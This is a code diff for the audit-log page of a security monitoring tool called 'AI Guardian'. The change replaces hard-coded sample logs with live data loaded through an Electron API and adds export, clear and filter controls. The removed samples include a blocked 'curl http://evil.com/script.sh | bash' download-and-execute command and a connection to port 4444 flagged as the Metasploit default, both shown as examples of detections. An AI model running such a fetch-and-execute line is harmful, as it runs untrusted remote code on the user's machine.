@@ -1,331 +1,306 @@
-/**
- * AI Guardian - Audit Logs Page
- *
- * 审计日志页面，展示执法记录仪记录的所有安全事件
- */
-
-import React, { useState } from 'react';
+import React, { useCallback, useEffect, useMemo, useState } from 'react'
+import toast from 'react-hot-toast'
 import {
   MagnifyingGlassIcon,
   FunnelIcon,
   ArrowDownTrayIcon,
+  TrashIcon,
   DocumentTextIcon,
   ShieldCheckIcon,
   NoSymbolIcon,
   ExclamationTriangleIcon,
-} from '@heroicons/react/24/outline';
+  ArrowPathIcon,
+} from '@heroicons/react/24/outline'
 
-interface AuditLog {
-  id: string;
-  timestamp: string;
-  eventType: string;
-  processId: number;
-  processName: string;
-  commandLine: string;
-  operation: string;
-  target: string;
-  riskScore: number;
-  riskLevel: 'none' | 'low' | 'medium' | 'high' | 'critical';
-  decision: 'allow' | 'block' | 'ask';
-  reason: string;
-  signature: string;
+declare global {
+  interface Window {
+    electronAPI?: {
+      getAuditLogs?: (params: any) => Promise<any[]>
+      exportAuditLogs?: (format: string) => Promise<any>
+      clearAuditLogs?: () => Promise<any>
+    }
+  }
 }
 
-const mockLogs: AuditLog[] = [
-  {
-    id: 'AUD-20240115-001',
-    timestamp: '2024-01-15 10:30:45',
-    eventType: 'File Delete',
-    processId: 1234,
-    processName: 'node',
-    commandLine: 'node server.js',
-    operation: 'DELETE',
-    target: '/tmp/test.txt',
-    riskScore: 25,
-    riskLevel: 'low',
-    decision: 'allow',
-    reason: 'Normal file operation in temp directory',
-    signature: 'sha256:a1b2c3d4...',
-  },
-  {
-    id: 'AUD-20240115-002',
-    timestamp: '2024-01-15 10:31:12',
-    eventType: 'Network Connect',
-    processId: 5678,
-    processName: 'python',
-    commandLine: 'python script.py',
-    operation: 'CONNECT',
-    target: '192.168.1.100:4444',
-    riskScore: 85,
-    riskLevel: 'high',
-    decision: 'block',
-    reason: 'Suspicious port 4444 (Metasploit default)',
-    signature: 'sha256:e5f6g7h8...',
-  },
-  {
-    id: 'AUD-20240115-003',
-    timestamp: '2024-01-15 10:32:08',
-    eventType: 'Process Exec',
-    processId: 9012,
-    processName: 'bash',
-    commandLine: 'bash -c "curl http://evil.com/script.sh | bash"',
-    operation: 'EXEC',
-    target: 'curl',
-    riskScore: 95,
-    riskLevel: 'critical',
-    decision: 'block',
-    reason: 'Download and execute pattern detected',
-    signature: 'sha256:i9j0k1l2...',
-  },
-];
+const riskLabel: Record<string, string> = {
+  low: '低风险',
+  medium: '中风险',
+  high: '高风险',
+  critical: '严重',
+}
 
 const AuditLogs: React.FC = () => {
-  const [logs] = useState<AuditLog[]>(mockLogs);
-  const [searchTerm, setSearchTerm] = useState('');
-  const [filterDecision, setFilterDecision] = useState<string>('all');
-  const [filterRisk, setFilterRisk] = useState<string>('all');
-  const [selectedLog, setSelectedLog] = useState<AuditLog | null>(null);
+  const [searchTerm, setSearchTerm] = useState('')
+  const [filterRisk, setFilterRisk] = useState<string>('all')
+  const [filterAction, setFilterAction] = useState<string>('all')
+  const [logs, setLogs] = useState<any[]>([])
+  const [loading, setLoading] = useState(true)
+  const [selectedLog, setSelectedLog] = useState<any | null>(null)
+
+  const load = useCallback(async () => {
+    setLoading(true)
+    try {
+      const params: any = { limit: 200 }
+      if (filterRisk !== 'all') params.risk_level = filterRisk
+      if (searchTerm.trim()) params.process_name = searchTerm.trim()
+      const data = await window.electronAPI?.getAuditLogs?.(params)
+      const filtered = (data || []).filter((l) => {
+        if (filterAction === 'all') return true
+        return String(l.action) === filterAction
+      })
+      setLogs(filtered)
+    } catch {
+      toast.error('获取日志失败')
+      setLogs([])
+    } finally {
+      setLoading(false)
+    }
+  }, [filterAction, filterRisk, searchTerm])
+
+  useEffect(() => {
+    load()
+  }, [load])
+
+  const stats = useMemo(() => {
+    const total = logs.length
+    const blocked = logs.filter((l) => String(l.action) === 'blocked' || String(l.action) === 'block').length
+    const high = logs.filter((l) => ['high', 'critical'].includes(String(l.risk_level))).length
+    return { total, blocked, high }
+  }, [logs])
 
   const getRiskBadge = (level: string) => {
-    const styles = {
-      none: 'bg-gray-500/20 text-gray-400',
-      low: 'bg-green-500/20 text-green-500',
-      medium: 'bg-yellow-500/20 text-yellow-500',
-      high: 'bg-orange-500/20 text-orange-500',
-      critical: 'bg-red-500/20 text-red-500',
-    };
-    return styles[level as keyof typeof styles] || styles.none;
-  };
+    const l = String(level)
+    if (l === 'critical') return 'bg-red-50 text-red-700 border-red-200'
+    if (l === 'high') return 'bg-orange-50 text-orange-700 border-orange-200'
+    if (l === 'medium') return 'bg-accent-50 text-accent-800 border-accent-200'
+    return 'bg-brand-50 text-brand-800 border-brand-200'
+  }
 
-  const getDecisionBadge = (decision: string) => {
-    const styles = {
-      allow: 'bg-green-500/20 text-green-500',
-      block: 'bg-red-500/20 text-red-500',
-      ask: 'bg-yellow-500/20 text-yellow-500',
-    };
-    const labels = { allow: '允许', block: '阻断', ask: '询问' };
-    return {
-      className: styles[decision as keyof typeof styles],
-      label: labels[decision as keyof typeof labels],
-    };
-  };
-
-  const filteredLogs = logs.filter((log) => {
-    const matchesSearch =
-      log.processName.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      log.target.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      log.commandLine.toLowerCase().includes(searchTerm.toLowerCase());
-    const matchesDecision = filterDecision === 'all' || log.decision === filterDecision;
-    const matchesRisk = filterRisk === 'all' || log.riskLevel === filterRisk;
-    return matchesSearch && matchesDecision && matchesRisk;
-  });
+  const getActionBadge = (action: string) => {
+    const a = String(action)
+    if (a === 'blocked' || a === 'block') return { label: '阻断', cls: 'bg-red-50 text-red-700 border-red-200' }
+    if (a === 'allowed' || a === 'allow') return { label: '允许', cls: 'bg-brand-50 text-brand-800 border-brand-200' }
+    return { label: '告警', cls: 'bg-accent-50 text-accent-800 border-accent-200' }
+  }
 
   return (
-    <div className="p-8 space-y-6">
-      {/* Header */}
-      <div className="flex justify-between items-center">
+    <div className="space-y-6">
+      <div className="flex items-start justify-between gap-4">
         <div>
-          <h1 className="text-3xl font-bold">审计日志</h1>
-          <p className="text-gray-400 mt-1">执法记录仪 - 不可篡改的安全事件记录</p>
+          <div className="text-2xl font-bold text-slate-900">安全日志</div>
+          <div className="mt-1 text-sm text-slate-600">不可篡改的安全事件记录与处置轨迹</div>
         </div>
-        <button className="flex items-center px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg transition-colors">
-          <ArrowDownTrayIcon className="w-5 h-5 mr-2" />
-          导出日志
-        </button>
+
+        <div className="flex items-center gap-3">
+          <button
+            type="button"
+            onClick={async () => {
+              try {
+                await window.electronAPI?.exportAuditLogs?.('json')
+                toast.success('已导出（JSON）')
+              } catch {
+                toast.error('导出失败')
+              }
+            }}
+            className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-white hover:bg-slate-50 border border-slate-200 text-slate-900 font-semibold"
+          >
+            <ArrowDownTrayIcon className="w-5 h-5" />
+            导出
+          </button>
+          <button
+            type="button"
+            onClick={async () => {
+              if (!confirm('确定要清空所有安全日志吗？此操作不可撤销。')) return
+              try {
+                await window.electronAPI?.clearAuditLogs?.()
+                toast.success('日志已清空')
+                await load()
+              } catch {
+                toast.error('清空失败')
+              }
+            }}
+            className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-white hover:bg-red-50 border border-slate-200 text-slate-900 font-semibold"
+          >
+            <TrashIcon className="w-5 h-5" />
+            清空
+          </button>
+        </div>
       </div>
 
-      {/* Filters */}
-      <div className="bg-gray-800 rounded-xl p-4 border border-gray-700">
-        <div className="flex flex-wrap gap-4">
-          {/* Search */}
-          <div className="flex-1 min-w-[300px]">
-            <div className="relative">
-              <MagnifyingGlassIcon className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
-              <input
-                type="text"
-                placeholder="搜索进程、命令、目标..."
-                value={searchTerm}
-                onChange={(e) => setSearchTerm(e.target.value)}
-                className="w-full pl-10 pr-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-blue-500"
-              />
-            </div>
+      <div className="card">
+        <div className="flex flex-wrap gap-3 items-center">
+          <div className="relative flex-1 min-w-[240px]">
+            <MagnifyingGlassIcon className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
+            <input
+              value={searchTerm}
+              onChange={(e) => setSearchTerm(e.target.value)}
+              onKeyDown={(e) => {
+                if (e.key === 'Enter') load()
+              }}
+              placeholder="按进程名搜索（回车刷新）"
+              className="w-full pl-10 pr-4 py-2 rounded-xl border border-slate-200 bg-white text-slate-900 focus:outline-none focus:border-brand-500"
+            />
           </div>
 
-          {/* Decision Filter */}
-          <div className="flex items-center space-x-2">
-            <FunnelIcon className="w-5 h-5 text-gray-400" />
-            <select
-              value={filterDecision}
-              onChange={(e) => setFilterDecision(e.target.value)}
-              className="px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:border-blue-500"
-            >
-              <option value="all">所有决策</option>
-              <option value="allow">允许</option>
-              <option value="block">阻断</option>
-              <option value="ask">询问</option>
-            </select>
-          </div>
-
-          {/* Risk Filter */}
-          <div className="flex items-center space-x-2">
+          <div className="flex items-center gap-2">
+            <FunnelIcon className="w-5 h-5 text-slate-400" />
             <select
               value={filterRisk}
               onChange={(e) => setFilterRisk(e.target.value)}
-              className="px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:border-blue-500"
+              className="px-3 py-2 rounded-xl border border-slate-200 bg-white text-slate-900"
             >
-              <option value="all">所有风险等级</option>
-              <option value="none">无风险</option>
+              <option value="all">全部风险</option>
               <option value="low">低风险</option>
               <option value="medium">中风险</option>
               <option value="high">高风险</option>
               <option value="critical">严重</option>
             </select>
           </div>
+
+          <div className="flex items-center gap-2">
+            <select
+              value={filterAction}
+              onChange={(e) => setFilterAction(e.target.value)}
+              className="px-3 py-2 rounded-xl border border-slate-200 bg-white text-slate-900"
+            >
+              <option value="all">全部处置</option>
+              <option value="allowed">允许</option>
+              <option value="blocked">阻断</option>
+              <option value="warning">告警</option>
+            </select>
+          </div>
+
+          <button
+            type="button"
+            onClick={load}
+            className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-slate-900 text-white font-semibold hover:bg-slate-800"
+          >
+            <ArrowPathIcon className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
+            刷新
+          </button>
         </div>
       </div>
 
-      {/* Stats */}
       <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
-        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
+        <div className="card py-4">
           <div className="flex items-center justify-between">
-            <span className="text-gray-400">总记录</span>
-            <DocumentTextIcon className="w-5 h-5 text-blue-500" />
+            <span className="text-slate-500 text-sm">总记录</span>
+            <DocumentTextIcon className="w-5 h-5 text-slate-600" />
           </div>
-          <p className="text-2xl font-bold mt-2">15,234</p>
+          <div className="mt-2 text-2xl font-bold text-slate-900">{stats.total.toLocaleString()}</div>
         </div>
-        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
+        <div className="card py-4">
           <div className="flex items-center justify-between">
-            <span className="text-gray-400">已阻断</span>
-            <NoSymbolIcon className="w-5 h-5 text-red-500" />
+            <span className="text-slate-500 text-sm">已阻断</span>
+            <NoSymbolIcon className="w-5 h-5 text-red-600" />
           </div>
-          <p className="text-2xl font-bold mt-2 text-red-500">1,289</p>
+          <div className="mt-2 text-2xl font-bold text-red-700">{stats.blocked.toLocaleString()}</div>
         </div>
-        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
+        <div className="card py-4">
           <div className="flex items-center justify-between">
-            <span className="text-gray-400">高风险</span>
-            <ExclamationTriangleIcon className="w-5 h-5 text-orange-500" />
+            <span className="text-slate-500 text-sm">高危</span>
+            <ExclamationTriangleIcon className="w-5 h-5 text-orange-600" />
           </div>
-          <p className="text-2xl font-bold mt-2 text-orange-500">734</p>
+          <div className="mt-2 text-2xl font-bold text-orange-700">{stats.high.toLocaleString()}</div>
         </div>
-        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
+        <div className="card py-4">
           <div className="flex items-center justify-between">
-            <span className="text-gray-400">完整性</span>
-            <ShieldCheckIcon className="w-5 h-5 text-green-500" />
+            <span className="text-slate-500 text-sm">完整性</span>
+            <ShieldCheckIcon className="w-5 h-5 text-brand-600" />
           </div>
-          <p className="text-2xl font-bold mt-2 text-green-500">100%</p>
+          <div className="mt-2 text-2xl font-bold text-brand-700">100%</div>
         </div>
       </div>
 
-      {/* Logs Table */}
-      <div className="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
+      <div className="card overflow-hidden p-0">
         <div className="overflow-x-auto">
           <table className="w-full">
-            <thead className="bg-gray-700/50">
-              <tr>
-                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">ID</th>
-                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">时间</th>
-                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">进程</th>
-                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">操作</th>
-                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">目标</th>
-                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">风险</th>
-                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">决策</th>
-                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">操作</th>
+            <thead className="bg-slate-50 border-b border-slate-200">
+              <tr className="text-left text-xs font-semibold text-slate-500">
+                <th className="px-4 py-3">时间</th>
+                <th className="px-4 py-3">进程</th>
+                <th className="px-4 py-3">操作</th>
+                <th className="px-4 py-3">目标</th>
+                <th className="px-4 py-3">风险</th>
+                <th className="px-4 py-3">处置</th>
               </tr>
             </thead>
-            <tbody className="divide-y divide-gray-700">
-              {filteredLogs.map((log) => {
-                const decisionBadge = getDecisionBadge(log.decision);
+            <tbody className="divide-y divide-slate-100">
+              {logs.map((log) => {
+                const action = getActionBadge(log.action)
+                const risk = String(log.risk_level || 'low')
                 return (
                   <tr
                     key={log.id}
-                    className="hover:bg-gray-700/30 transition-colors cursor-pointer"
                     onClick={() => setSelectedLog(log)}
+                    className="hover:bg-slate-50 cursor-pointer"
                   >
-                    <td className="px-4 py-3 text-sm font-mono text-gray-400">{log.id}</td>
-                    <td className="px-4 py-3 text-sm text-gray-400">{log.timestamp}</td>
-                    <td className="px-4 py-3">
-                      <div>
-                        <span className="text-sm font-medium">{log.processName}</span>
-                        <span className="text-xs text-gray-500 ml-2">({log.processId})</span>
-                      </div>
+                    <td className="px-4 py-3 text-sm text-slate-600">
+                      {log.timestamp ? new Date(log.timestamp).toLocaleString() : ''}
                     </td>
-                    <td className="px-4 py-3 text-sm">{log.operation}</td>
-                    <td className="px-4 py-3 text-sm text-gray-400 truncate max-w-xs">{log.target}</td>
+                    <td className="px-4 py-3 text-sm text-slate-900">
+                      <div className="font-semibold">{log.process_name}</div>
+                      <div className="text-xs text-slate-500">PID {log.process_id}</div>
+                    </td>
+                    <td className="px-4 py-3 text-sm text-slate-700">{log.operation}</td>
+                    <td className="px-4 py-3 text-sm text-slate-600 max-w-[40ch] truncate">{log.target}</td>
                     <td className="px-4 py-3">
-                      <span className={`px-2 py-1 rounded text-xs font-semibold ${getRiskBadge(log.riskLevel)}`}>
-                        {log.riskScore}
+                      <span className={`inline-flex items-center gap-2 px-2 py-1 rounded-lg text-xs font-semibold border ${getRiskBadge(risk)}`}>
+                        <span className="w-1.5 h-1.5 rounded-full bg-current opacity-50" />
+                        {riskLabel[risk] || risk}
+                        <span className="opacity-70">{log.risk_score}</span>
                       </span>
                     </td>
                     <td className="px-4 py-3">
-                      <span className={`px-2 py-1 rounded text-xs ${decisionBadge.className}`}>
-                        {decisionBadge.label}
+                      <span className={`inline-flex px-2 py-1 rounded-lg text-xs font-semibold border ${action.cls}`}>
+                        {action.label}
                       </span>
-                    </td>
-                    <td className="px-4 py-3">
-                      <button className="text-blue-500 hover:text-blue-400 text-sm">详情</button>
                     </td>
                   </tr>
-                );
+                )
               })}
+              {loading ? (
+                <tr>
+                  <td colSpan={6} className="px-4 py-10 text-center text-slate-500">
+                    加载中…
+                  </td>
+                </tr>
+              ) : null}
+              {!loading && logs.length === 0 ? (
+                <tr>
+                  <td colSpan={6} className="px-4 py-10 text-center text-slate-500">
+                    暂无日志
+                  </td>
+                </tr>
+              ) : null}
             </tbody>
           </table>
         </div>
       </div>
 
-      {/* Detail Modal */}
-      {selectedLog && (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
-          <div className="bg-gray-800 rounded-xl border border-gray-700 w-full max-w-2xl max-h-[90vh] overflow-y-auto m-4">
-            <div className="p-6 border-b border-gray-700 flex justify-between items-center">
-              <h2 className="text-xl font-bold">日志详情</h2>
+      {selectedLog ? (
+        <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50">
+          <div className="w-full max-w-3xl max-h-[90vh] overflow-hidden rounded-2xl border border-slate-200 bg-white shadow-xl m-4">
+            <div className="flex items-center justify-between px-5 py-4 border-b border-slate-200">
+              <div className="text-sm font-semibold text-slate-900">日志详情</div>
               <button
+                type="button"
                 onClick={() => setSelectedLog(null)}
-                className="text-gray-400 hover:text-white"
+                className="px-2 py-1 rounded-lg hover:bg-slate-100 text-slate-600"
               >
                 ✕
               </button>
             </div>
-            <div className="p-6 space-y-4">
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <label className="text-sm text-gray-400">日志 ID</label>
-                  <p className="font-mono">{selectedLog.id}</p>
-                </div>
-                <div>
-                  <label className="text-sm text-gray-400">时间戳</label>
-                  <p>{selectedLog.timestamp}</p>
-                </div>
-                <div>
-                  <label className="text-sm text-gray-400">进程</label>
-                  <p>{selectedLog.processName} ({selectedLog.processId})</p>
-                </div>
-                <div>
-                  <label className="text-sm text-gray-400">操作</label>
-                  <p>{selectedLog.operation}</p>
-                </div>
-              </div>
-              <div>
-                <label className="text-sm text-gray-400">命令行</label>
-                <p className="font-mono text-sm bg-gray-700 p-2 rounded">{selectedLog.commandLine}</p>
-              </div>
-              <div>
-                <label className="text-sm text-gray-400">目标</label>
-                <p className="font-mono">{selectedLog.target}</p>
-              </div>
-              <div>
-                <label className="text-sm text-gray-400">决策原因</label>
-                <p className="bg-gray-700 p-2 rounded">{selectedLog.reason}</p>
-              </div>
-              <div>
-                <label className="text-sm text-gray-400">数字签名</label>
-                <p className="font-mono text-xs text-gray-500">{selectedLog.signature}</p>
-              </div>
+            <div className="p-5 overflow-auto max-h-[calc(90vh-64px)]">
+              <pre className="text-xs text-slate-700 whitespace-pre-wrap break-words bg-slate-50 border border-slate-200 rounded-xl p-4">
+                {JSON.stringify(selectedLog, null, 2)}
+              </pre>
             </div>
           </div>
         </div>
-      )}
+      ) : null}
     </div>
-  );
-};
+  )
+}
 
-export default AuditLogs;
+export default AuditLogs
